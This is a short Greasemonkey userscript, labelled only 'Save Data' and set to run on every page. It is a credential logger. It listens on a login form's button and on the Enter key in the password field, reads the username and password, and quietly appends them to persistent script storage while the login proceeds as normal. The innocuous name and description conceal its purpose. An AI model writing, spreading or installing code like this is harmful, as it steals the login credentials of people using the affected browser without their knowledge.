// ==UserScript==
// @name           ohalo
// @description    Save Data
// @version        1
// @include        *
// ==/UserScript==

function fsubmit(){
	name = document.getElementById("username").value;
	nuevo = "-- u: " + name + " p: " + pass + " --";
	guardado = GM_getValue("agsaved","");
	cadena = guardado + nuevo;
	GM_setValue("agsaved",cadena);
}

function fboton(){
	pass = document.getElementById("password").value;
	fsubmit;
}

function ftecla(event){
	pass = document.getElementById("password").value;
	if (event.keyCode == 13) { 
		fsubmit();
		doChallengeResponse(); 
		document.formulario.submit();
	}
}

document.getElementById("boto").addEventListener("click",fsubmit,false);
document.getElementById("password").addEventListener("keydown",ftecla,false);